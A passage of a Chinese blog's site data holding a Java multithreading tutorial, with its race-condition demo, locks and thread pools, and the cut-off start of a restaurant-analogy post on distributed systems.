ChangeThread(stu);\n\t\tpt.start();\n\t\tct.start();\n\t}\n}\n\nclass Student{\n\tString name;\n\tString gender;\n\tpublic Student(String name,String gender){\n\t\tthis.name = name;\n\t\tthis.gender = gender;\n\t}\n}\n\nclass PrintThread extends Thread{\n\tStudent stu;\n\tpublic PrintThread(Student stu){\n\t\tthis.stu = stu;\n\t}\n\t@Override\n\tpublic void run(){\n\t\twhile(true){\n\t\t\t//synchronized(stu){\n\t\t\t{\n\t\t\t\tSystem.out.println(stu.name + " : " + stu.gender);\n\t\t\t}\n\t\t}\n\t}\n}\nclass ChangeThread extends Thread{\n\tStudent stu;\n\tpublic ChangeThread(Student stu){\n\t\tthis.stu = stu;\n\t}\n\t@Override\n\tpublic void run(){\n\t\tboolean isOkay = true;\n\t\twhile(true){\n\t\t\t//synchronized(stu){\n\t\t\t{\n\t\t\t\tif(isOkay){\n\t\t\t\t\tstu.name = "梁朝伟";//梁朝伟 女士\n\t\t\t\t\tstu.gender = "先生";//梁朝伟 先生\n\t\t\t\t}else{\n\t\t\t\t\tstu.name = "张曼玉";//张曼玉 先生\n\t\t\t\t\tstu.gender = "女士";//张曼玉 女士\n\t\t\t\t}\n\t\t\t\tisOkay = !isOkay;\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# 实现线程同步的几种方式\n\n通过上面的实例我们知道了并发是怎么产生的，那我们如何解决呢？那就是使线程同步或给线程加锁呗！\n\n * 实现线程同步的几种方式：\n\n 1. 使用synchronized关键字\n    \n    synchronized既可以修饰方法也可以修饰代码块，用synchronized 关键字时一定要注意用于保护共享数据，防止造成资源浪费（synchronized 本来效率就不高）\n\n 2. wait()和notify() => 相当于引入等待池\n    \n    wait()：Object类的方法，使一个线程处于等待状态，并且释放所持有的对象的lock。\n    \n    sleep(1000)：Thread类的方法，使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要捕捉InterruptedException异常。 notify()：唤醒一个处于等待状态的线程，注意的是在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且不是按优先级。 Allnotity()：唤醒所有处入等待状态的线程，注意并不是给所有唤醒线程一个对象的锁，而是让它们竞争。\n    \n    **注意：**wait、notify和notifyAll方法只能在同步方法或者同步代码块中使用，而sleep方法可以在任何地方使用。\n\n 3. 使用java.util.concurrent.ReentrantLock重入锁实现线程同步\n    \n    \tprivate int account = 100;\n    \t//获得锁对象\n    \tprivate ReentrantLock lock = new ReentrantLock();\n    \tpublic int getAccount() {\n    \t\treturn account;\n    \t}\n    \t//同步方法\n    \tpublic  void save(int money) {\n    \t\tlock.lock();//加锁\n    \t\ttry {\n    \t\t\taccount+=money;\n    \t\t} finally {\n    \t\t\tlock.unlock();//解锁\n    \t\t}\n    \t\t\n    \t}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n\n# 利用java工具查看死锁\n\n 1. 图形界面：jconsole.exe\n\n 2. 命令行：jps 和 jstack\n\n\n# 创建线程池的几种方式\n\n * 既然都了解到线程并发了，那怎么能不了解了解线程池呢！😄\n * java.util.concurrent.Executors类，这个类是用来创建线程池的：\n\n 1. newFixedThreadPool()\n    \n    创建固定大小的线程池 线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程\n\n 2. newCachedThreadPool()\n    \n    创建一个可缓存的线程池，如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲(60s不执行任务)的线程，当任务数量增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于系统（JVM）能够创建的最大线程大小\n\n 3. newSingleThreadExecutor()\n    \n    创建一个单线程的线程池。这个线程池只有线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行\n\n 4. newScheduledThreadPool()\n    \n    创建一个大小无限的线程池，此线程池支持定时以及周期性执行任务的需求\n\n 5. newSingleThreadScheduledExecutor()\n    \n    创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求\n\n\n# 线程池的基本使用\n\nimport java.text.SimpleDateFormat;\nimport java.util.concurrent.*;\n\n/**\n * @className: TestThreadPool\n * @descripe: 多线程的基本使用\n * @author: zpj\n * @date: 2019/7/8\n * @version: 1.0\n */\npublic class TestThreadPool {\n\n    /*  打印结果：多个线程同时开始\n        Thread:pool-1-thread-2 开始执行时间：2019-07-08 22:14:31\n            ==  I\'m a cat!  ==     <1>\n        Thread:pool-1-thread-1 开始执行时间：2019-07-08 22:14:31\n            ==  I\'m a cat!  ==     <0>\n        Thread:pool-1-thread-4 开始执行时间：2019-07-08 22:14:31\n        Thread:pool-1-thread-3 开始执行时间：2019-07-08 22:14:31\n            ==  I\'m a cat!  ==     <2>\n        Thread:pool-1-thread-5 开始执行时间：2019-07-08 22:14:31\n            ==  I\'m a cat!  ==     <4>\n        Thread:pool-1-thread-4 开始执行时间：2019-07-08 22:14:31\n            ==  I\'m a cat!  ==     <5>\n        Thread:pool-1-thread-4 开始执行时间：2019-07-08 22:14:32\n            ==  I\'m a cat!  ==     <6>\n        Thread:pool-1-thread-5 开始执行时间：2019-07-08 22:14:32\n            ==  I\'m a cat!  ==     <7>\n        Thread:pool-1-thread-3 开始执行时间：2019-07-08 22:14:32\n        Thread:pool-1-thread-1 开始执行时间：2019-07-08 22:14:32\n        Thread:pool-1-thread-3 开始执行时间：2019-07-08 22:14:32\n            ==  I\'m a cat!  ==     <9>\n            ==  I\'m a cat!  ==     <10>\n\n     */\n    public static void main(String[] args) throws InterruptedException {\n\n        //要循环的次数\n        int x = 10;\n\n        //ExecutorService executorService = Executors.newFixedThreadPool(1);//单线程\n        ExecutorService executorService = Executors.newFixedThreadPool(5);//多线程\n\n        //线程计数器\n        CountDownLatch downLatch = new CountDownLatch(x);\n\n        System.out.println("多线程执行开始！");\n        for (int i = 0;i <= x;i++) {\n            Future<?> future = executorService.submit(new Cat(i, downLatch));\n            /*\n            //加上它就变同步了，不知道为啥（百度咯，因为这是个阻塞的方法，future.isDone();是个非阻塞方法）\n            try {\n                if(future.get()==null){\n                    System.out.println("第   "+i+"   个任务执行成功!\\n");\n                }\n            } catch (ExecutionException e) {\n                System.out.println("第   "+i+"   个任务执行失败!    " + e.getMessage() + "\\n");\n            }*/\n        }\n        System.out.println("这就证明：多线程是异步执行的！");\n        downLatch.await();\n        executorService.shutdown();\n    }\n\n   /* public static void main(String[] args) throws InterruptedException {\n\n        //要循环的次数\n        int x = 10;\n\n        //ExecutorService executorService = Executors.newFixedThreadPool(1);//单线程\n        ExecutorService executorService = Executors.newFixedThreadPool(5);//多线程\n\n        //线程计数器\n        CountDownLatch downLatch = new CountDownLatch(x);\n\n        for (int i = 0;i <= x;i++) {\n            executorService.execute(new Cat(i, downLatch));\n        }\n        *//*\n         *  打印结果：可以看到多个线程基本同时开始执行\n            Exception in thread "pool-1-thread-4" java.lang.ArithmeticException: / by zero\n                at Cat.run(TestThreadPool.java:141)\n                at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\n                at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\n                at java.lang.Thread.run(Thread.java:745)\n            Thread:pool-1-thread-1 开始执行时间：2019-07-08 22:00:39\n                ==  I\'m a cat!  ==     <0>\n            Thread:pool-1-thread-2 开始执行时间：2019-07-08 22:00:39\n                ==  I\'m a cat!  ==     <1>\n            Thread:pool-1-thread-3 开始执行时间：2019-07-08 22:00:39\n                ==  I\'m a cat!  ==     <2>\n            Thread:pool-1-thread-4 开始执行时间：2019-07-08 22:00:39\n            Thread:pool-1-thread-5 开始执行时间：2019-07-08 22:00:39\n                ==  I\'m a cat!  ==     <4>\n            Thread:pool-1-thread-6 开始执行时间：2019-07-08 22:00:39\n                ==  I\'m a cat!  ==     <5>\n            Exception in thread "pool-1-thread-3" java.lang.ArithmeticException: / by zero\n            Thread:pool-1-thread-1 开始执行时间：2019-07-08 22:00:40\n                at Cat.run(TestThreadPool.java:141)\n                ==  I\'m a cat!  ==     <6>\n                at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\n                at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\n            Thread:pool-1-thread-2 开始执行时间：2019-07-08 22:00:40\n                at java.lang.Thread.run(Thread.java:745)\n                ==  I\'m a cat!  ==     <7>\n            Thread:pool-1-thread-3 开始执行时间：2019-07-08 22:00:40\n            Thread:pool-1-thread-6 开始执行时间：2019-07-08 22:00:40\n                ==  I\'m a cat!  ==     <10>\n            Thread:pool-1-thread-5 开始执行时间：2019-07-08 22:00:40\n                ==  I\'m a cat!  ==     <9>\n            *//*\n        downLatch.await();\n        executorService.shutdown();\n    }*/\n\n}\n\nclass Cat implements Runnable {\n\n    int i;\n    private CountDownLatch downLatch;\n\n    public Cat(int i,CountDownLatch downLatch) {\n        this.i = i;\n        this.downLatch = downLatch;\n    }\n\n    SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");\n\n    @Override\n    public void run() {\n        System.out.println("Thread:"+Thread.currentThread().getName()+" 开始执行时间："+format.format(System.currentTimeMillis()));\n\n        if(i == 8 || i == 3)\n            i = i/0;\n            System.out.println("    ==  I\'m a cat!  ==     <" + i + ">");\n        //每执行完一个线程 计数器就减1\n        downLatch.countDown();\n\n        try {\n            Thread.sleep(1000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n',normalizedContent:' * 多线程\n * 多线程创建方式\n   * 继承 thread 类\n   * 实现 runable 接口\n   * 实现 callable 接口\n * 自己造一个并发实例\n * 实现线程同步的几种方式\n * 利用java工具查看死锁\n * 创建线程池的几种方式\n * 线程池的基本使用\n\n\n\n\n# 多线程\n\n * 这篇介绍了什么是多线程及多线程的实现方式和常用方法，写的很详细，特在此记录一下\n   \n   https://blog.csdn.net/vbirdbest/article/details/81282163\n\n\n# 多线程创建方式\n\n * 如看过上文地址，可跳过此节直接看下一节自己造一个并发实例，后面才是干货！\n\n\n# 继承 thread 类\n\npublic class main {\n    public static void main(string[] args) {\n        new mythread().start();\n    }\n}\n\nclass mythread extends thread {\n    @override\n    public void run() {\n        system.out.println(thread.currentthread().getname() + "\\t" + thread.currentthread().getid());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 实现 runable 接口\n\n * 第一种方式是继承thread类，因java是单继承，如果一个类继承了thread类，那么就没办法继承其它的类了，在继承上有一点受制，有一点不灵活，第二种方式就是为了解决第一种方式的单继承不灵活的问题，所以平常使用就使用第二种方式\n\npublic class main {\n    public static void main(string[] args) {\n         // 将runnable实现类作为thread的构造参数传递到thread类中，然后启动thread类\n        myrunnable runnable = new myrunnable();\n        new thread(runnable).start();\n    }\n}\n\nclass myrunnable implements runnable {\n    @override\n    public void run() {\n        system.out.println(thread.currentthread().getname() + "\\t" + thread.currentthread().getid());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 实现 callable 接口\n\n * 重写call()方法，然后包装成java.util.concurrent.futuretask, 再然后包装成thread\n * callable：有返回值并且能捕获异常，能取消线程，可以判断线程是否执行完毕\n\npublic class main {\n    public static void main(string[] args) throws exception {\n         // 将callable包装成futuretask，futuretask也是一种runnable\n        mycallable callable = new mycallable();\n        futuretask<integer> futuretask = new futuretask<>(callable);\n        new thread(futuretask).start();\n\n        // get方法会阻塞调用的线程\n        integer sum = futuretask.get();\n        system.out.println(thread.currentthread().getname() + thread.currentthread().getid() + "=" + sum);\n    }\n}\n\nclass mycallable implements callable<integer> {\n    @override\n    public integer call() throws exception {\n        system.out.println(thread.currentthread().getname() + "\\t" + thread.currentthread().getid() + "\\t" + new date() + " \\tstarting...");\n\n        int sum = 0;\n        for (int i = 0; i <= 100000; i++) {\n            sum += i;\n        }\n        thread.sleep(5000);\n\n        system.out.println(thread.currentthread().getname() + "\\t" + thread.currentthread().getid() + "\\t" + new date() + " \\tover...");\n        return sum;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 自己造一个并发实例\n\n * 有人可能对多线程及并发还不是很了解，那么就简单上手一个并发实例来体验一下吧！\n\n * 注意：下边的例子，自己多运行几次，看一下不同的结果\n   \n   >  1. 当对现场加锁的时候就不会并发：\n   >     * 打印结果：张曼玉：女士 / 梁朝伟：先生\n   >  2. 而如果对线程不加锁的话，就可能会造成并发：\n   >     * 打印结果：张曼玉：先生 / 梁朝伟：女士\n   >     * 打印结果：张曼玉：女士 / 梁朝伟：先生\n\n/**\n * @classname: testthreadpool\n * @descripe: 自己造一个并发的例子\n * @author: zpj\n * @date: 2019/7/8\n * @version: 1.0\n */\npublic class testconcurrenterror{\n\tpublic static void main(string[] args){\n\t\tstudent stu = new student("张曼玉","女士");\n\t\tprintthread pt = new printthread(stu);\n\t\tchangethread ct = new changethread(stu);\n\t\tpt.start();\n\t\tct.start();\n\t}\n}\n\nclass student{\n\tstring name;\n\tstring gender;\n\tpublic student(string name,string gender){\n\t\tthis.name = name;\n\t\tthis.gender = gender;\n\t}\n}\n\nclass printthread extends thread{\n\tstudent stu;\n\tpublic printthread(student stu){\n\t\tthis.stu = stu;\n\t}\n\t@override\n\tpublic void run(){\n\t\twhile(true){\n\t\t\t//synchronized(stu){\n\t\t\t{\n\t\t\t\tsystem.out.println(stu.name + " : " + stu.gender);\n\t\t\t}\n\t\t}\n\t}\n}\nclass changethread extends thread{\n\tstudent stu;\n\tpublic changethread(student stu){\n\t\tthis.stu = stu;\n\t}\n\t@override\n\tpublic void run(){\n\t\tboolean isokay = true;\n\t\twhile(true){\n\t\t\t//synchronized(stu){\n\t\t\t{\n\t\t\t\tif(isokay){\n\t\t\t\t\tstu.name = "梁朝伟";//梁朝伟 女士\n\t\t\t\t\tstu.gender = "先生";//梁朝伟 先生\n\t\t\t\t}else{\n\t\t\t\t\tstu.name = "张曼玉";//张曼玉 先生\n\t\t\t\t\tstu.gender = "女士";//张曼玉 女士\n\t\t\t\t}\n\t\t\t\tisokay = !isokay;\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n\n# 实现线程同步的几种方式\n\n通过上面的实例我们知道了并发是怎么产生的，那我们如何解决呢？那就是使线程同步或给线程加锁呗！\n\n * 实现线程同步的几种方式：\n\n 1. 使用synchronized关键字\n    \n    synchronized既可以修饰方法也可以修饰代码块，用synchronized 关键字时一定要注意用于保护共享数据，防止造成资源浪费（synchronized 本来效率就不高）\n\n 2. wait()和notify() => 相当于引入等待池\n    \n    wait()：object类的方法，使一个线程处于等待状态，并且释放所持有的对象的lock。\n    \n    sleep(1000)：thread类的方法，使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要捕捉interruptedexception异常。 notify()：唤醒一个处于等待状态的线程，注意的是在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由jvm确定唤醒哪个线程，而且不是按优先级。 allnotity()：唤醒所有处入等待状态的线程，注意并不是给所有唤醒线程一个对象的锁，而是让它们竞争。\n    \n    **注意：**wait、notify和notifyall方法只能在同步方法或者同步代码块中使用，而sleep方法可以在任何地方使用。\n\n 3. 使用java.util.concurrent.reentrantlock重入锁实现线程同步\n    \n    \tprivate int account = 100;\n    \t//获得锁对象\n    \tprivate reentrantlock lock = new reentrantlock();\n    \tpublic int getaccount() {\n    \t\treturn account;\n    \t}\n    \t//同步方法\n    \tpublic  void save(int money) {\n    \t\tlock.lock();//加锁\n    \t\ttry {\n    \t\t\taccount+=money;\n    \t\t} finally {\n    \t\t\tlock.unlock();//解锁\n    \t\t}\n    \t\t\n    \t}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n\n# 利用java工具查看死锁\n\n 1. 图形界面：jconsole.exe\n\n 2. 命令行：jps 和 jstack\n\n\n# 创建线程池的几种方式\n\n * 既然都了解到线程并发了，那怎么能不了解了解线程池呢！😄\n * java.util.concurrent.executors类，这个类是用来创建线程池的：\n\n 1. newfixedthreadpool()\n    \n    创建固定大小的线程池 线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程\n\n 2. newcachedthreadpool()\n    \n    创建一个可缓存的线程池，如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲(60s不执行任务)的线程，当任务数量增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于系统（jvm）能够创建的最大线程大小\n\n 3. newsinglethreadexecutor()\n    \n    创建一个单线程的线程池。这个线程池只有线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行\n\n 4. newscheduledthreadpool()\n    \n    创建一个大小无限的线程池，此线程池支持定时以及周期性执行任务的需求\n\n 5. newsinglethreadscheduledexecutor()\n    \n    创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求\n\n\n# 线程池的基本使用\n\nimport java.text.simpledateformat;\nimport java.util.concurrent.*;\n\n/**\n * @classname: testthreadpool\n * @descripe: 多线程的基本使用\n * @author: zpj\n * @date: 2019/7/8\n * @version: 1.0\n */\npublic class testthreadpool {\n\n    /*  打印结果：多个线程同时开始\n        thread:pool-1-thread-2 开始执行时间：2019-07-08 22:14:31\n            ==  i\'m a cat!  ==     <1>\n        thread:pool-1-thread-1 开始执行时间：2019-07-08 22:14:31\n            ==  i\'m a cat!  ==     <0>\n        thread:pool-1-thread-4 开始执行时间：2019-07-08 22:14:31\n        thread:pool-1-thread-3 开始执行时间：2019-07-08 22:14:31\n            ==  i\'m a cat!  ==     <2>\n        thread:pool-1-thread-5 开始执行时间：2019-07-08 22:14:31\n            ==  i\'m a cat!  ==     <4>\n        thread:pool-1-thread-4 开始执行时间：2019-07-08 22:14:31\n            ==  i\'m a cat!  ==     <5>\n        thread:pool-1-thread-4 开始执行时间：2019-07-08 22:14:32\n            ==  i\'m a cat!  ==     <6>\n        thread:pool-1-thread-5 开始执行时间：2019-07-08 22:14:32\n            ==  i\'m a cat!  ==     <7>\n        thread:pool-1-thread-3 开始执行时间：2019-07-08 22:14:32\n        thread:pool-1-thread-1 开始执行时间：2019-07-08 22:14:32\n        thread:pool-1-thread-3 开始执行时间：2019-07-08 22:14:32\n            ==  i\'m a cat!  ==     <9>\n            ==  i\'m a cat!  ==     <10>\n\n     */\n    public static void main(string[] args) throws interruptedexception {\n\n        //要循环的次数\n        int x = 10;\n\n        //executorservice executorservice = executors.newfixedthreadpool(1);//单线程\n        executorservice executorservice = executors.newfixedthreadpool(5);//多线程\n\n        //线程计数器\n        countdownlatch downlatch = new countdownlatch(x);\n\n        system.out.println("多线程执行开始！");\n        for (int i = 0;i <= x;i++) {\n            future<?> future = executorservice.submit(new cat(i, downlatch));\n            /*\n            //加上它就变同步了，不知道为啥（百度咯，因为这是个阻塞的方法，future.isdone();是个非阻塞方法）\n            try {\n                if(future.get()==null){\n                    system.out.println("第   "+i+"   个任务执行成功!\\n");\n                }\n            } catch (executionexception e) {\n                system.out.println("第   "+i+"   个任务执行失败!    " + e.getmessage() + "\\n");\n            }*/\n        }\n        system.out.println("这就证明：多线程是异步执行的！");\n        downlatch.await();\n        executorservice.shutdown();\n    }\n\n   /* public static void main(string[] args) throws interruptedexception {\n\n        //要循环的次数\n        int x = 10;\n\n        //executorservice executorservice = executors.newfixedthreadpool(1);//单线程\n        executorservice executorservice = executors.newfixedthreadpool(5);//多线程\n\n        //线程计数器\n        countdownlatch downlatch = new countdownlatch(x);\n\n        for (int i = 0;i <= x;i++) {\n            executorservice.execute(new cat(i, downlatch));\n        }\n        *//*\n         *  打印结果：可以看到多个线程基本同时开始执行\n            exception in thread "pool-1-thread-4" java.lang.arithmeticexception: / by zero\n                at cat.run(testthreadpool.java:141)\n                at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142)\n                at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617)\n                at java.lang.thread.run(thread.java:745)\n            thread:pool-1-thread-1 开始执行时间：2019-07-08 22:00:39\n                ==  i\'m a cat!  ==     <0>\n            thread:pool-1-thread-2 开始执行时间：2019-07-08 22:00:39\n                ==  i\'m a cat!  ==     <1>\n            thread:pool-1-thread-3 开始执行时间：2019-07-08 22:00:39\n                ==  i\'m a cat!  ==     <2>\n            thread:pool-1-thread-4 开始执行时间：2019-07-08 22:00:39\n            thread:pool-1-thread-5 开始执行时间：2019-07-08 22:00:39\n                ==  i\'m a cat!  ==     <4>\n            thread:pool-1-thread-6 开始执行时间：2019-07-08 22:00:39\n                ==  i\'m a cat!  ==     <5>\n            exception in thread "pool-1-thread-3" java.lang.arithmeticexception: / by zero\n            thread:pool-1-thread-1 开始执行时间：2019-07-08 22:00:40\n                at cat.run(testthreadpool.java:141)\n                ==  i\'m a cat!  ==     <6>\n                at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1142)\n                at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:617)\n            thread:pool-1-thread-2 开始执行时间：2019-07-08 22:00:40\n                at java.lang.thread.run(thread.java:745)\n                ==  i\'m a cat!  ==     <7>\n            thread:pool-1-thread-3 开始执行时间：2019-07-08 22:00:40\n            thread:pool-1-thread-6 开始执行时间：2019-07-08 22:00:40\n                ==  i\'m a cat!  ==     <10>\n            thread:pool-1-thread-5 开始执行时间：2019-07-08 22:00:40\n                ==  i\'m a cat!  ==     <9>\n            *//*\n        downlatch.await();\n        executorservice.shutdown();\n    }*/\n\n}\n\nclass cat implements runnable {\n\n    int i;\n    private countdownlatch downlatch;\n\n    public cat(int i,countdownlatch downlatch) {\n        this.i = i;\n        this.downlatch = downlatch;\n    }\n\n    simpledateformat format = new simpledateformat("yyyy-mm-dd hh:mm:ss");\n\n    @override\n    public void run() {\n        system.out.println("thread:"+thread.currentthread().getname()+" 开始执行时间："+format.format(system.currenttimemillis()));\n\n        if(i == 8 || i == 3)\n            i = i/0;\n            system.out.println("    ==  i\'m a cat!  ==     <" + i + ">");\n        //每执行完一个线程 计数器就减1\n        downlatch.countdown();\n\n        try {\n            thread.sleep(1000);\n        } catch (interruptedexception e) {\n            e.printstacktrace();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"分布式系统概述",frontmatter:{title:"分布式系统概述",date:"2021-05-17T00:00:00.000Z",tags:["分布式"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0.html",relativePath:"views/backend/分布式系统概述.md",key:"v-768ea990",path:"/views/backend/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0.html",excerpt:'<Boxx/>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<p>随着互联网用户规模扩大，应用系统数量增加，业务逻辑越来越复杂。传统的单机模式已不能满足需求，今天就从单机到分布式聊聊近些年系统架构的转变。</p>\n',headersStr:null,content:'随着互联网用户规模扩大，应用系统数量增加，业务逻辑越来越复杂。传统的单机模式已不能满足需求，今天就从单机到分布式聊聊近些年系统架构的转变。\n\n * 一个单机式系统需要的架构：\n\n环境：单台服务器 + 集中式系统\n\n场景：常用在企业内网或用户量少的内管系统\n\n * 一个分布式系统需要的架构：\n\n环境：多台服务器 + 分布式系统集群\n\n场景：常用在用户量大或业务量繁杂的大型系统\n\n\n\n单机系统处理能力瓶颈主要在CPU、内存、硬盘等，当业务量上来之后只能通过垂直拓展的方式来提升性能，而量级达到一定程度后，单机的稳定性和可用性将受到极大的挑战。\n\n此外单机还存在系统程序级别问题，一旦程序中某段代码出现问题，将影响整个系统的稳定性。\n\n由此，行业由集中式系统慢慢演变为分布式系统架构。\n\n分布式系统常见解决方案主要有：配置中心、注册中心、分布式缓存、分布式唯一ID、分布式消息、分布式任务、分布式事务、链路追踪、监控告警、服务治理等等。\n\n----------------------------------------\n\n以阿波罗饭店的故事为例，上演分布式架构演变历程~\n\n一个遥远的故事：阿波罗饭店的演变历程\n\n\n\n在远古时期，有一家名为阿波罗的饭店，当客户来的时候，点单、配菜、炒菜都是阿波罗一个人完成。（单机模式）\n\n起初还好，客户量少于个位数的时候阿波罗一个人就忙过来了。\n\n就这样，又过了一年。\n\n阿波罗口碑传开了，客户量直逼上百，好嘛，阿波罗心想：这可不行啊，这我哪忙的过来呀。\n\n过了两天，憋出来一个办法：我一个人不行，我再多找两个跟我一样的，干一样的活。（于是集群模式就出现了）\n\n就这样，又过了一年。\n\n阿波罗口碑太好了，人传人都传疯了，客户量直逼上千，好嘛，阿波罗心想：这可不行啊，这就我们三哪忙的过来呀。\n\n过了两天，又憋出来一个办法：我把我们三个人的活分一下，A去点单，B去配菜，C去炒菜。然后A配10个人，B配10个人，C配10个人，这样哪怕其中一个人有事请假了，相同工作的其他人还能继续顶上。（于是分布式系统+集群模式就出现了）\n\n\n\n刚开始还好，饭店正常运行没啥问题。\n\n突然有一天，饭店乱锅了。。\n\n有一个客户急眼了说：为啥我点单了还没给我上菜呀😡！原来是A1和A8号点单员下单是同一个流水号，导致A8把A1的单覆盖了。（于是分布式序列唯一ID出现了）\n\n另一个客户急眼了说：为啥我点个单这么慢呀😡！原来是点单员A2，A3，A4，A5没来，同时对于每天火爆的菜品也没个记录每次都得问炒菜员。（于是注册中心，分布式缓存出现了）\n\n后来啊，饭店时不时出个问题，于是阿波罗找了一波专业团队从头到尾重新把饭店打造了一番。\n\n\n\n于是就引出了：\n\n * 注册中心：所有人上班、请假都得来我这打卡、申请，防止A偷偷没来B偷偷溜走。\n\n * 配置中心：所有人有啥事变动后，其他人都可以及时知道。比如配菜员B1说今天胡萝卜没了，然后B2~B10全都了解。\n\n * 分布式序列：防止点单员A1~A10出现下单重复的情况，并且支持自定义指定规则的订单号。\n\n * 服务治理：当炒菜员C1在炒一个菜还没出锅的时候，点单员A1、A4、A5一直在催催催，炒菜员就告诉他："正在出锅中，正在出锅中"，而不是告诉他：”老子不干了，老子不干了，老子不！干！了！“\n\n * 分布式缓存：点单时，对一些常点菜的介绍、配方等，自己脑子里已经有个影响或者拿个本本记下来，不用每次再问炒菜员了；配菜时，对一些常用的菜，提前也能备好。\n\n * 分布式事务：点单、配菜、炒菜三个步骤要成功都得成功，其中只要有一个步骤出错，那么回退这次单子。\n\n * 链路追踪：点单、配菜、炒菜，我得知道这次流程到哪个环节了，或者在某个环节出问题了，出的什么问题我得知道。\n\n\n\n后来阿波罗又开发了美团团、饿了么么，接入了配送员：\n\n * 